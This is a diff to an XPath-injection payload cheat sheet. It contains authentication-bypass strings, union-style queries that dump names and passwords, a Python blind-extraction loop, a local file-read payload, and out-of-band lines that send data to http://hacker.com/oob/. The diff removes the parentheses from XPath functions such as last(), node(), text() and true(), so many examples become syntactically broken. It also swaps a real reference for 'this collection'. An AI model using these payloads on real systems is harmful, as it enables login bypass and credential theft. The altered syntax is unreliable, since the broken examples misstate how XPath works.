@@ -32,9 +32,9 @@ Examples of path expressions and their results include:
 Predicates are used to refine selections:
 
 - **/bookstore/book\[1]**: The first book element child of the bookstore element is selected. A workaround for IE versions 5 to 9, which index the first node as \[0], is setting the SelectionLanguage to XPath through JavaScript.
-- **/bookstore/book\[last()]**: The last book element child of the bookstore element is selected.
-- **/bookstore/book\[last()-1]**: The penultimate book element child of the bookstore element is selected.
-- **/bookstore/book\[position()<3]**: The first two book elements children of the bookstore element are selected.
+- **/bookstore/book\[last]**: The last book element child of the bookstore element is selected.
+- **/bookstore/book\[last-1]**: The penultimate book element child of the bookstore element is selected.
+- **/bookstore/book\[position<3]**: The first two book elements children of the bookstore element are selected.
 - **//title\[@lang]**: All title elements with a lang attribute are selected.
 - **//title\[@lang='en']**: All title elements with a "lang" attribute value of "en" are selected.
 - **/bookstore/book\[price>35.00]**: All book elements of the bookstore with a price greater than 35.00 are selected.
@@ -46,7 +46,7 @@ Wildcards are employed for matching unknown nodes:
 
 - **\***: Matches any element node.
 - **@**\*: Matches any attribute node.
-- **node()**: Matches any node of any kind.
+- **node**: Matches any node of any kind.
 
 Further examples include:
 
@@ -83,27 +83,27 @@ Further examples include:
 All names - [pepe, mark, fino]
 name
 //name
-//name/node()
-//name/child::node()
+//name/node
+//name/child::node
 user/name
 user//name
 /user/name
 //user/name
 
 All values - [pepe, peponcio, admin, mark, ...]
-//user/node()
-//user/child::node()
+//user/node
+//user/child::node
 
 
 Positions
-//user[position()=1]/name #pepe
-//user[last()-1]/name #mark
-//user[position()=1]/child::node()[position()=2] #peponcio (password)
+//user[position=1]/name #pepe
+//user[last-1]/name #mark
+//user[position=1]/child::node[position=2] #peponcio (password)
 
 Functions
-count(//user/node()) #3*3 = 9 (count all values)
-string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
-substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
+count(//user/node) #3*3 = 9 (count all values)
+string-length(//user[position=1]/child::node[position=1]) #Length of "pepe" = 4
+substrig(//user[position=2/child::node[position=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
 ```
 
 ### Identify & stealing the schema
@@ -148,7 +148,7 @@ doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]
 ### **Example of queries:**
 
 ```
-string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
+string(//user[name/text='+VAR_USER+' and password/text='+VAR_PASSWD+']/account/text)
 $q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
 ```
 
@@ -159,7 +159,7 @@ $q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['
 " or "1"="1
 ' or ''='
 " or ""="
-string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())
+string(//user[name/text='' or '1'='1' and password/text='' or '1'='1']/account/text)
 
 Select account
 Select the account using the username and use one of the previous values in the password field
@@ -181,20 +181,20 @@ Bypass with first match
 ' or /* or '
 ' or "a" or '
 ' or 1 or '
-' or true() or '
-string(//user[name/text()='' or true() or '' and password/text()='']/account/text())
+' or true or '
+string(//user[name/text='' or true or '' and password/text='']/account/text)
 
 Select account
 'or string-length(name(.))<10 or' #Select account with length(name)<10
 'or contains(name,'adm') or' #Select first account having "adm" in the name
 'or contains(.,'adm') or' #Select first account having "adm" in the current value
-'or position()=2 or' #Select 2º account
-string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())
+'or position=2 or' #Select 2º account
+string(//user[name/text=''or position=2 or'' and password/text='']/account/text)
 
 Select account (name known)
 admin' or '
 admin' or '1'='2
-string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
+string(//user[name/text='admin' or '1'='2' and password/text='']/account/text)
 ```
 
 ## String extraction
@@ -208,12 +208,12 @@ The output contains strings and the user can manipulate the values to search:<su
 ```
 ') or 1=1 or (' #Get all names
 ') or 1=1] | //user/password[('')=(' #Get all names and passwords
-') or 2=1] | //user/node()[('')=(' #Get all values
-')] | //./node()[('')=(' #Get all values
-')] | //node()[('')=(' #Get all values
+') or 2=1] | //user/node[('')=(' #Get all values
+')] | //./node[('')=(' #Get all values
+')] | //node[('')=(' #Get all values
 ') or 1=1] | //user/password[('')=(' #Get all names and passwords
 ')] | //password%00 #All names and passwords (abusing null injection)
-')]/../*[3][text()!=(' #All the passwords
+')]/../*[3][text!=(' #All the passwords
 ')] | //user/*[1] | a[(' #The ID of all users
 ')] | //user/*[2] | a[(' #The name of all users
 ')] | //user/*[3] | a[(' #The password of all users
@@ -225,12 +225,12 @@ The output contains strings and the user can manipulate the values to search:<su
 ### **Get length of a value and extract it by comparisons:**
 
 ```bash
-' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
-' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"
+' or string-length(//user[position=1]/child::node[position=1])=4 or ''=' #True if length equals 4
+' or substring((//user[position=1]/child::node[position=1]),1,1)="a" or ''=' #True is first equals "a"
 
 substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
 
-... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
+... and ( if ( $employee/role = 2 ) then error else 0 )... #When error is executed it rises an error and never returns a value
 ```
 
 ### **Python Example**
@@ -240,7 +240,7 @@ import requests, string
 
 flag = ""
 l = 0
-alphabet = string.ascii_letters + string.digits + "{}_()"
+alphabet = string.ascii_letters + string.digits + "{}_"
 for i in range(30):
     r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
     if ("TRUE_COND" in r.text):
@@ -259,7 +259,7 @@ for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
 ### Read file
 
 ```python
-(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
+(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text[1]),3,1))) < 127
 ```
 
 ## OOB Exploitation
@@ -269,7 +269,7 @@ doc(concat("http://hacker.com/oob/", RESULTS))
 doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
 doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))
 
-#Instead of doc() you can use the function doc-available
+#Instead of doc you can use the function doc-available
 doc-available(concat("http://hacker.com/oob/", RESULTS))
 #the doc available will respond true or false depending if the doc exists,
 #user not(doc-available(...)) to invert the result if you need to
@@ -285,7 +285,7 @@ doc-available(concat("http://hacker.com/oob/", RESULTS))
 
 ## References
 
-- [1] [PayloadsAllTheThings - XPATH Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
+- [1] [this collection - XPATH Injection]
 - [2] OWASP Testing Guide - Testing for XPath Injection (OTG-INPVAL-010)
 - [3] [W3Schools - XPath Syntax](https://www.w3schools.com/xml/xpath_syntax.asp)
 
